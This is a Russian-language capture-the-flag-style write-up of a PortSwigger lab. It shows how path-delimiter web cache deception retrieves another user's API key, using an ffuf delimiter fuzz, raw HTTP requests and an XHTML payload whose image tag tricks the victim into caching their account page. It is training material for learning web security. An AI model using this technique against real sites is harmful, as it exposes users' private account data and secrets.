---
title: "Exploiting path delimiters for web cache deception"
date: 2025-07-18
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/web-cache-deception/wcd-using-delimiter-discrepancies/web-cache-deception/lab-wcd-exploiting-path-delimiters"
classes: wide
---

Для прохождения лабы нужно найти `API`-ключи пользователя `carlos` с помощью **Web cache deception**. 

Для входа в свою учетную запись можно использовать креды `wiener`:`peter`.

```
https://0a750077032ed4f682a6e83000eb0023.web-security-academy.net/
```

## Solution

Залогинюсь в аккаунт.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_web_cache/IMG_Exploiting_path_delimiters_for_web_cache_deception/1.png){: height="200" .align-center}

Аккаунт находится по следующему пути — `/my-account`. Добавлю строчку `bar` для проверки, выдаст ли мне ту же страницу.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_web_cache/IMG_Exploiting_path_delimiters_for_web_cache_deception/2.png){: height="200" .align-center}

Ожидаемо, что нет. Попробую перебрать  [список разделителей](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list), чтобы понять, какие из них подойдут. Для разнообразия воспользуюсь [`ffuf`](https://cu63.github.io/tools/ffuf/).

```bash
ffuf -w wordlists/webcache_delimeters.txt -u https://0a750077032ed4f682a6e83000eb0023.web-security-academy.net/my-accountFUZZbar -X GET
```

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_web_cache/IMG_Exploiting_path_delimiters_for_web_cache_deception/3.png){: height="200" .align-center}

Предположу, что эти символы являются разделителями. Наиболее подходящим выглядит `;`. Использую его:

```
https://0a750077032ed4f682a6e83000eb0023.web-security-academy.net/my-account;bar
```

Получил ту же страницу ответа. Добавлю расширение `.css`, чтобы проверить, будет ли ответ кэшироваться. Для этого удобнее смотреть `Burp Suite`.

```http
GET /my-account;bar.css HTTP/2
Host: 0a750077032ed4f682a6e83000eb0023.web-security-academy.net
Cookie: session=qqr2NcH61DjJaM74YK4er7ewvpoSuduN
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Заголовок ответа:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Server: Apache-Coyote/1.1
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 3833
```

Вижу в ответе `X-Cache: miss` и `Cache-Control`. Значит `.css` файлы кэшируются. Перейду в эксплойт сервер для создания нагрузки.

Так как я занимаюсь разработкой фишинговых нагрузок на работе, то мне не хочется использовать только `.html` и `.js` форматы. Поэтому вот вам немного флекса с `XHTML`:

```xhtml
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <title>Payload</title>
</head>
<body>
    <img src="https://0a750077032ed4f682a6e83000eb0023.web-security-academy.net/my-account;pwned.css" alt="Pwn" />
</body>
</html>
```

При открытии файла происходит обращение по адресу `https://0a750077032ed4f682a6e83000eb0023.web-security-academy.net/my-account;pwned.css` для получения картинки. Но что-то идет не так, и данные пользователя кэшируются. Вот незадача. Файл называют `expoit.xhtml`, в `Content-Type` выставляю значение `application/xhtml+xml`. На сайте это выглядит вот так:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_web_cache/IMG_Exploiting_path_delimiters_for_web_cache_deception/4.png){: height="200" .align-center}

Отправляю запрос и проверяю страницу:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_web_cache/IMG_Exploiting_path_delimiters_for_web_cache_deception/5.png){: height="200" .align-center}

`API`-ключ получен. Проверю его в верификаторе:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_web_cache/IMG_Exploiting_path_delimiters_for_web_cache_deception/6.png){: height="200" .align-center}
